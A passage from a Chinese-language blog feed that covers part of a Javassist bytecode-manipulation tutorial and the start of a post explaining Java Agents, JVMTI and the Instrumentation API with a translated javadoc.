</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加和删除成员"><a href="#添加和删除成员" class="headerlink" title="添加和删除成员"></a>添加和删除成员</h3><p><strong>ClassFile 提供了 addField()，addMethod() 和 addAttribute()</strong>，来向类添加字段、方法和类文件属性。</p><p>注意，FieldInfo，MethodInfo 和 AttributeInfo 对象包含了一个指向 ConstPool（常量池表）对象的链接。 ConstPool 对象必须是 ClassFile 对象和添加到该 ClassFile 对象的 FieldInfo（或MethodInfo 等）对象的共同对象。 换句话说，一个FieldInfo（或MethodInfo等）对象不能在不同的ClassFile 对象之间共享。</p><p>要从 ClassFile 对象中删除字段或方法，必须首先获取包含该类的所有字段的 java.util.List 对象。 getFields() 和 getMethods() 会返回这些列表。可以通过调用List对象的 remove() 来删除字段或方法。可以以类似的方式删除属性。在 FieldInfo 或 MethodInfo 中调用 getAttributes() 以获取属性列表，并从列表中删除一个属性。</p><h3 id="遍历方法体"><a href="#遍历方法体" class="headerlink" title="遍历方法体"></a>遍历方法体</h3><p>使用 CodeIterator 可以检查方法体中的每个字节码指令，要获得 CodeIterator 对象，参考以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassFile cf = ... ; </span><br><span class="line">MethodInfo minfo = cf.getMethod(<span class="string">"move"</span>);    <span class="comment">// we assume move is not overloaded. </span></span><br><span class="line">CodeAttribute ca = minfo.getCodeAttribute(); </span><br><span class="line">CodeIterator i = ca.iterator();</span><br></pre></td></tr></table></figure><p>CodeIterator 对象允许你逐个访问每个字节码指令。下面展示了一部分 CodeIterator 中声明的方法：</p><ul><li><code>void begin()</code> 移动到第一条指令</li><li><code>void move(int index)</code> 移动到指定位置的指令</li><li><code>boolean hasNext()</code> 是否有下一条指令</li><li><code>int next()</code> 返回下一条指令的索引。注意，它<strong>不返回下一条指令的操作码</strong>。</li><li><code>int byteAt（int index）</code> 返回索引处的无符号8位整数。</li><li><code>int u16bitAt（int index）</code> 返回索引处的无符号16位整数。</li><li><code>int write（byte [] code，int index）</code> 在索引处写入字节数组。</li><li><code>void insert（int index，byte [] code）</code> 在索引处插入字节数组。自动调整分支偏移量。</li></ul><p>以下代码段打印了方法体中所有的指令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CodeIterator ci = ... ;</span><br><span class="line"><span class="keyword">while</span> (ci.hasNext()) &#123;</span><br><span class="line">    <span class="keyword">int</span> index = ci.next();</span><br><span class="line">    <span class="keyword">int</span> op = ci.byteAt(index);</span><br><span class="line">    System.out.println(Mnemonic.OPCODE[op]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="生成字节码序列"><a href="#生成字节码序列" class="headerlink" title="生成字节码序列"></a>生成字节码序列</h3><p><code>Bytecode</code> 对象表示字节码指令序列。它是一个可扩展，可增长的字节码数组。<br>以下是示例代码段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ConstPool cp = ...;    <span class="comment">// constant pool table</span></span><br><span class="line">Bytecode b = <span class="keyword">new</span> Bytecode(cp, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">b.addIconst(<span class="number">3</span>);</span><br><span class="line">b.addReturn(CtClass.intType);</span><br><span class="line">CodeAttribute ca = b.toCodeAttribute();</span><br></pre></td></tr></table></figure><p>这段代码产生以下序列的代码属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iconst_3</span><br><span class="line">ireturn</span><br></pre></td></tr></table></figure><p>还可以通过调用 Bytecode 中的 get() 方法来获取包含此序列的字节数组。获得的数组可以插入另一个代码属性中。</p><p>Bytecode 提供了许多方法来添加特定的指令，例如使用 addOpcode() 添加一个 8 位操作码，使用 addIndex() 用于添加一个索引。每个操作码的值定义在 Opcode 接口中。</p><p>addOpcode() 和添加特定指令的方法，会自动维持最大堆栈深度，除非控制流没有分支。最大堆栈深度这个值可以通过调用 Bytecode 的 getMaxStack() 方法来获得。它也反映在从 Bytecode对象构造的 CodeAttribute 对象上。要重新计算方法体的最大堆栈深度，可以调用 CodeAttribute 的 computeMaxStack() 方法。</p><p>可以使用Bytecode来构造一个方法。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ClassFile cf = ...</span><br><span class="line">Bytecode code = <span class="keyword">new</span> Bytecode(cf.getConstPool());</span><br><span class="line">code.addAload(<span class="number">0</span>);</span><br><span class="line">code.addInvokespecial(<span class="string">"java/lang/Object"</span>, MethodInfo.nameInit, <span class="string">"()V"</span>);</span><br><span class="line">code.addReturn(<span class="keyword">null</span>);</span><br><span class="line">code.setMaxLocals(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">MethodInfo minfo = <span class="keyword">new</span> MethodInfo(cf.getConstPool(), MethodInfo.nameInit, <span class="string">"()V"</span>);</span><br><span class="line">minfo.setCodeAttribute(code.toCodeAttribute());</span><br><span class="line">cf.addMethod(minfo);</span><br></pre></td></tr></table></figure><p>这段代码制作了默认的构造函数，并将其添加到cf指定的类中，Bytecode对象首先被转换为CodeAttribute对象，然后添加到minfo指定的方法中。最后将该方法添加到类文件cf中。</p><h3 id="注解-元标签"><a href="#注解-元标签" class="headerlink" title="注解 元标签"></a>注解 元标签</h3><p>注释作为运行时不可见（或可见）的注记属性，存储在类文件中。</p><p>调用 getAttribute（AnnotationsAttribute.invisibleTag）方法，可以从 ClassFile，MethodInfo 或 FieldInfo 中获取注记属性。</p><p>更多信息，请参阅 <code>javassist.bytecode.AnnotationsAttribute</code> 和<code>javassist.bytecode.annotation</code> 包的 javadoc 手册。</p><p>Javassist还允许你通过更高级别的API访问注解。如果你想通过CtClass访问注解，在CtClass或CtBehavior中调用getAnnotations()。</p><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>Javassist 的低级别 API 完全支持 Java 5 引入的泛型。但是，高级别的API（如CtClass）不直接支持泛型。</p><p>Java的泛型是通过擦除技术实现的。在编译之后，所有的类型参数都会被丢掉。例如，假设你的源代码声明了一个参数化类型Vector <String>。</String></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vector&lt;String&gt; v = <span class="keyword">new</span> Vector&lt;String&gt;();</span><br><span class="line">  :</span><br><span class="line">String s = v.get(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>编译后的字节码等价于以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vector v = <span class="keyword">new</span> Vector();</span><br><span class="line">  :</span><br><span class="line">String s = (String)v.get(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>所以当你写字节码变换器时，你可以直接放弃所有类型参数。</p><p>由于<strong>Javassist中嵌入的编译器不支持泛型</strong>，所以如果源代码是由Javassist编译的，例如通过CtMethod.make()，<strong>必须在调用者处插入一个显式类型转换</strong>。如果源代码是由普通的Java编译器（如javac）编译的，则无需进行类型转换。</p><p>例如，如果你有一个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Wrapper</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  T value;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Wrapper</span><span class="params">(T t)</span> </span>&#123; value = t; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并想添加一个接口 Getter<T> 到类 Wrapper<T>：</T></T></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Getter</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function">T <span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么你真正要添加的接口其实是Getter（将类型参数<T>丢掉），最后你添加到 Wrapper 类的方法是这样的：</T></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> value; &#125;</span><br></pre></td></tr></table></figure><p>注意，不需要类型参数。 由于 get 返回一个 Object，如果源代码是由 Javassist 编译的，那么在调用方需要进行显式类型转换。 例如，如果类型参数 T 是 String，则必须插入（String），如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wrapper w = ...</span><br><span class="line">String s = (String)w.get();</span><br></pre></td></tr></table></figure><p>如果你需要在运行时通过反射使类型参数可以访问，你必须在类文件中添加通用签名。更多的细节，请参见CtClass中setGenericSignature方法的API文档（javadoc）。</p><h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>目前，Javassist 不直接支持可变参数。 因此，要使用 varargs 创建方法，必须<strong>显式设置方法修饰符</strong>。假设要定义下面这个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">(<span class="keyword">int</span>... args)</span> </span>&#123; <span class="keyword">return</span> args.length; &#125;</span><br></pre></td></tr></table></figure><p>使用 Javassist 应该是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = <span class="comment">/* target class */</span>;</span><br><span class="line">CtMethod m = CtMethod.make(<span class="string">"public int length(int[] args) &#123; return args.length; &#125;"</span>, cc);</span><br><span class="line">m.setModifiers(m.getModifiers() | Modifier.VARARGS);</span><br><span class="line">cc.addMethod(m);</span><br></pre></td></tr></table></figure><p>参数类型<code>int ...</code>被更改为<code>int []</code>，<code>Modifier.VARARGS</code>被添加到方法修饰符中。</p><p>要在由 Javassist 的编译器编译的源代码中调用此方法，需要这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;);</span><br></pre></td></tr></table></figure><p>而不是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;醉里挑灯看剑，梦回吹角连营。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理Javassist相关知识 。  &lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Javassist" scheme="https://0range228.github.io/tags/Javassist/"/>
    
  </entry>
  
  <entry>
    <title>Java Agent解读</title>
    <link href="https://0range228.github.io/Java-Agent%E8%A7%A3%E8%AF%BB/"/>
    <id>https://0range228.github.io/Java-Agent%E8%A7%A3%E8%AF%BB/</id>
    <published>2021-02-01T13:37:00.000Z</published>
    <updated>2021-02-10T15:06:45.207Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>空山新雨后，天色晚来秋。</p></blockquote><p>整理Java Agent相关知识 。</p><a id="more"></a><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>Java Agent是一个运行在目标JVM的特定程序，它的职责是负责从目标JVM中获取数据，然后将数据传递给外部进程。加载Agent的时机可以是目标JVM启动之时，也可以是在目标JVM运行时进行加载。</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210207121651182.png" alt="image-20210207121651182"></p><h2 id="JVMTI"><a href="#JVMTI" class="headerlink" title="JVMTI"></a>JVMTI</h2><p><strong>==万物起源==</strong></p><p>JVMTI(JVM Tool Interface)是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。</p><h2 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h2><p>在Java SE 5之前，要实现一个Agent只能通过编写Native代码来实现。</p><p>从Java SE 5开始，可以使用Java的Instrumentation接口（<strong>java.lang.instrument</strong>包）来编写Agent。</p><p>从而 Java SE 6 的新特性改变了这种情况，通过 Java Tool API 中的 <strong>attach</strong> 方式，我们可以很方便地在运行过程中动态地设置加载代理类，以达到Instrumentation的目的。</p><p>并且从Java SE 6开始，可以向native method插桩。</p><p><strong>==无论是通过Native的方式还是通过Java Instrumentation接口的方式来编写Agent，它们的工作都是借助JVMTI来进行完成。==</strong></p><h1 id="Instrumentation-1"><a href="#Instrumentation-1" class="headerlink" title="Instrumentation"></a>Instrumentation</h1><p>这里把Instrumentation单独拿出来细说<code>java.lang.instrument.Instrumentation</code>.</p><p>Instrumentation接口设计初衷是为了收集Java程序运行时的数据，用于监控运行程序状态，记录日志，分析代码用的。</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210207135925174.png" alt="image-20210207135925174"></p><p>目前可以实现(对应JVM方法)：</p><ol><li><p>动态添加或移除自定义的<code>ClassFileTransformer</code>（<code>addTransformer/removeTransformer</code>）</p><p>JVM会在类加载时调用Agent中注册的<code>ClassFileTransformer</code>；</p></li><li><p>动态修改<code>classpath</code>（<code>appendToBootstrapClassLoaderSearch</code>、<code>appendToSystemClassLoaderSearch</code>）</p><p>将Agent程序添加到<code>BootstrapClassLoader</code>和<code>SystemClassLoaderSearch</code>（对应的是<code>ClassLoader类的getSystemClassLoader方法</code>，默认是<code>sun.misc.Launcher$AppClassLoader</code>）中搜索；</p></li><li><p>动态获取所有<code>JVM</code>已加载的类(<code>getAllLoadedClasses</code>)；</p></li><li><p>动态获取某个类加载器已实例化的所有类(<code>getInitiatedClasses</code>)。</p></li><li><p>重定义某个已加载的类的字节码(<code>redefineClasses</code>)。</p></li><li><p>动态设置<code>JNI</code>前缀(<code>setNativeMethodPrefix</code>)，可以实现Hook native方法。</p></li><li><p>重新加载某个已经被JVM加载过的类字节码(<code>retransformClasses</code>)。</p></li></ol><p>两种部署模式：</p><p>Java Agent支持目标JVM启动时加载，也支持在目标JVM运行时加载，这两种不同的加载模式会使用不同的入口函数。</p><p>Java Agent和普通的Java类并没有任何区别，普通的Java程序中规定了<code>main</code>方法为程序入口，而Java Agent则将<code>premain</code>（Agent模式）和<code>agentmain</code>（Attach模式）作为了Agent程序的入口，两者所接受的参数是完全一致的。</p><p><code>Instrumentation</code>类方法如下：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210202230129428.png" alt="image-20210202230129428"></p><p>学习API最好的方法就是阅读JavaDoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.instrument;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    该类提供了工具化Java编程语言代码所需的服务。</span><br><span class="line">    仪表化是指在方法中添加字节码，以收集数据，供工具使用。</span><br><span class="line">    由于这些变化是纯粹的加法，所以这些工具不会修改应用程序的状态或行为。</span><br><span class="line">    这种良性工具的例子包括监控代理、剖析器、覆盖率分析器和事件记录器。</span><br><span class="line">    </span><br><span class="line">    下面有两种方式来实例化Instrumentation接口：</span><br><span class="line">      <span class="number">1</span>.当JVM启动时，-javaagent：Agent.jar 指示代理类。在这种情况下，premain方法会接收一个Instrumentation实例作为入参。</span><br><span class="line">      <span class="number">2</span>.当JVM启动之后，可以Attach目标进程上。在这种情况下，agentmain方法会接收一个Instrumentation实例作为入参。</span><br><span class="line">     </span><br><span class="line">    一旦Agent获得一个Instrumentation实例，代理可以在任何时候调用实例上的方法。</span><br><span class="line">      </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer,<span class="keyword">boolean</span> canRetransform)</span></span></span><br><span class="line"><span class="function">      注册所提供的Tranformer。从此以后所有类定义都会被Tranformer看到，但不包括任何已注册的Transformer所依赖的类的定义。</span></span><br><span class="line"><span class="function">      当类被加载时，当类被重新定义时，Tranformer被调用；</span></span><br><span class="line"><span class="function">      如果 canRetransform 为真，当类被重新转换时，变压器被调用。</span></span><br><span class="line"><span class="function">    变换调用的顺序请参见 ClassFileTransformer.transformer。</span></span><br><span class="line"><span class="function">    如果一个Transformer在执行过程中抛出了异常，JVM仍然会依次调用其他注册的Transformer。</span></span><br><span class="line"><span class="function">    同一个Transformer可以被添加一次以上，但强烈不鼓励这样做，可以通过创建一个新的Transformer实例来避免这种情况。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span></span><br><span class="line"><span class="function">      解除所提供的Transformer注册。今后的类定义将不会显示给Transformer。</span></span><br><span class="line"><span class="function">      删除Transformer最近添加的匹配实例。由于类加载的多线程特性，Transformer在被删除后可能会收到调用。</span></span><br><span class="line"><span class="function">      Transformer的编写应考虑到这种情况。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isRetransformClassesSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回当前JVM配置是否支持类的重新转换。</span></span><br><span class="line"><span class="function">      重构已经加载的类的能力是JVM的一个可选能力，只有当代理JAR中的Can-Retransform-Classes manifest属性被设置为<span class="keyword">true</span>时，才支持重构。</span></span><br><span class="line"><span class="function">      只有在代理 JAR 文件中 Can-Retransform-Classes manifest 属性被设置为 <span class="keyword">true</span>（如包规范中所述）且 JVM 支持此能力时，才会支持重构。</span></span><br><span class="line"><span class="function">      在单个JVM的单个实例化过程中，对该方法的多次调用将始终返回相同的答案。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span></span><br><span class="line"><span class="function">      给Class&lt;?&gt; classes 中的若干类进行转换。</span></span><br><span class="line"><span class="function">      该方法便于对已经加载的类进行转换。</span></span><br><span class="line"><span class="function">      当类被初始加载或重新定义时，可以使用ClassFileTransformer对初始类文件字节进行转换。</span></span><br><span class="line"><span class="function">      这个函数会重新运行转换过程（无论之前是否发生过转换）。</span></span><br><span class="line"><span class="function">      重新转换遵循以下步骤：</span></span><br><span class="line"><span class="function">      1. 从初始的类文件字节开始</span></span><br><span class="line"><span class="function">      2. 对于每个添加了 canRetransform <span class="keyword">false</span> 的Transformer，由 transform 返回的字节将被重新使用，作为变换的输出，不做任何修改；</span></span><br><span class="line"><span class="function">      3. 对于每个添加了 canRetransform <span class="keyword">true</span> 的Transformer，这些Transformer都会调用 transform 方法。</span></span><br><span class="line"><span class="function">      4.转化后的类文件字节被安装为类的新定义。</span></span><br><span class="line"><span class="function">      变换的顺序在 transform 方法中描述。这个相同的顺序被用于自动重新应用无法变换的变换。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">      初始类文件的字节代表传递给ClassLoader.defineClass或redefineClasses的字节（在任何转换行为之前），然而它们可能不完全匹配。常量池可能没有相同的布局或内容。常量池可能有更多或更少的条目。常量池条目的顺序可能不同，但是，方法字节码中的常量池索引会对应。一些属性可能不存在。在顺序没有意义的地方，例如方法的顺序，顺序可能不会被保留。</span></span><br><span class="line"><span class="function">      该方法会在一个集合上操作（看入参的形式就是一个不定数组），以允许同时对多个类进行相互依赖的改变（类 A 的重构可能需要类 B 的重构）。</span></span><br><span class="line"><span class="function">      如果一个重构的方法有高频活动的栈帧，这些活动帧将继续运行原方法的字节码。重构后的方法将在新的调用.<span class="title">invoke</span><span class="params">()</span>中使用。</span></span><br><span class="line"><span class="function">      这个方法不会引起任何初始化.换句话说，重新定义一个类不会导致其初始化。静态变量的值将保持在调用之前的状态。</span></span><br><span class="line"><span class="function">      重构后的类的实例不会受到影响。</span></span><br><span class="line"><span class="function">      重构可以改变方法体、常量池和类属性。重构不能增加、删除或重命名字段或方法，不能改变方法的签名，也不能改变继承。这些限制也许会在未来的版本中被取消。类文件字节的检查、验证和安装直到应用了转换之后才会进行，如果结果字节有错误，这个方法将抛出一个异常。</span></span><br><span class="line"><span class="function">      如果本方法抛出异常，说明没有类被重新转换。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isRedefineClassesSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回当前JVM配置是否支持类的重新定义。</span></span><br><span class="line"><span class="function">      重新定义已经加载的类的能力是JVM的一个可选能力，只有当代理JAR文件中的Can-Redefine-Classes manifest属性被设置为<span class="keyword">true</span>时，才会支持重新定义。</span></span><br><span class="line"><span class="function">      只有当代理JAR文件中的Can-Redefine-Classes manifest属性被设置为<span class="keyword">true</span>时，才会支持重新定义（如包规范中所述），并且JVM支持该能力。在单个JVM的单次实例化过程中，对该方法的多次调用将始终返回相同的答案。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span> <span class="keyword">throws</span> ClassNotFoundException,</span></span><br><span class="line"><span class="function">                     UnmodifiableClassException</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">      使用提供的类文件重新定义提供的类集。</span></span><br><span class="line"><span class="function">      这个方法用于替换类的定义，而不引用现有的类文件字节。</span></span><br><span class="line"><span class="function">      就像从源码重新编译以进行修复和继续调试时一样。当现有的类文件字节要被转换时（例如在字节码instrumentation中），应该使用retransformClasses。</span></span><br><span class="line"><span class="function">      这个方法在一个集合上操作，以便允许同时对多个类进行相互依赖的改变（对类A的重新定义可能需要对类B的重新定义）。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span></span><br><span class="line"><span class="function">      确定一个类是否可以通过retransformClasses或redefineClasses进行修改。如果一个类是可修改的，那么本方法返回<span class="keyword">true</span>。如果一个类是不可修改的，那么这个方法返回<span class="keyword">false</span>。</span></span><br><span class="line"><span class="function">      要想对一个类进行重构，<span class="title">isRetransformClassesSupported</span><span class="params">()</span>也必须为真。但是is的值不会影响这个函数返回的值。要想重新定义一个类，<span class="title">isRedefineClassesSupported</span><span class="params">()</span>也必须为真，但<span class="title">isRedefineClassesSupported</span><span class="params">()</span>的值不会影响这个函数返回的值。</span></span><br><span class="line"><span class="function">      基元类（例如java.lang.Integer.TYPE）和数组类是永远不能修改的。                 </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Class[] <span class="title">getAllLoadedClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回JVM当前加载的所有类的数组。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">Class[] <span class="title">getInitiatedClasses</span><span class="params">(ClassLoader loader)</span></span></span><br><span class="line"><span class="function">      返回一个数组，该数组包含了所有由loader加载的类。如果提供的Loader为空，则返回由bootstrap类Loader加载的类。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getObjectSize</span><span class="params">(Object objectToSize)</span></span></span><br><span class="line"><span class="function">返回指定对象消耗的存储量的近似值。这个结果可能包括对象的部分或全部开销，因此对于在单独一个实现内进行比较是有用的，但对于实现之间的比较是没有用的。在JVM的单次调用中，估计值可能会改变。</span></span><br><span class="line"><span class="function">                       </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span></span><br><span class="line"><span class="function">      指定一个JAR文件（包含插桩类），让它由Bootstrap加载器加载。</span></span><br><span class="line"><span class="function">      当虚拟机内置的类加载器（称为 "bootstrap class loader"）搜索某个类不成功时，JAR文件中的条目也会被搜索。</span></span><br><span class="line"><span class="function">本方法可以多次使用，按照本方法被调用的顺序添加多个JAR文件进行搜索。</span></span><br><span class="line"><span class="function">      Agent应该注意确保JAR文件中除了那些将由引导类加载器定义的类或资源，不包含任何其他类或资源。如果不遵守这个警告，可能会导致难以诊断的意外行为。例如，假设有一个加载器L，L的用于授权的父类是bootstrap类加载器。此外，L定义的类C中的一个方法引用了一个非公共的访问者类C$1，如果JAR文件中包含一个类C$1，那么授权给bootstrap类加载器将导致C$1被bootstrap类加载器定义。在这个例子中，一个IllegalAccessError将被抛出，可能会导致应用程序失败。避免这类问题的一个方法是为插桩类使用一个独特的包名。</span></span><br><span class="line"><span class="function">                       </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span></span><br><span class="line"><span class="function">      指定一个JAR文件（包含插桩类），让它由SystemClassLoader。</span></span><br><span class="line"><span class="function">      这里面的SystemClassLoader其实就是ApplicationClassLoader。</span></span><br><span class="line"><span class="function">      当委托的系统类加载器（参见<span class="title">getSystemClassLoader</span><span class="params">()</span>）搜索一个类不成功时，JarFile中的条目将被搜索。</span></span><br><span class="line"><span class="function">本方法可以多次使用，按照本方法被调用的顺序添加多个JAR文件进行搜索。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Agent应注意确保JAR中不包含除SystemClassLoader以外的任何类或资源。如果不遵守这个警告，可能会导致难以诊断的意外行为（参见appendToBootstrapClassLoaderSearch）。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">如果SystemClassLoader实现了一个名为appendToClassPathForInstrumentation的方法，那么它就支持添加一个要搜索的JAR文件，该方法接收一个类型为java.lang.String的单一参数。该方法不需要公开访问。JAR文件的名称是通过调用jarfile上的<span class="title">getName</span><span 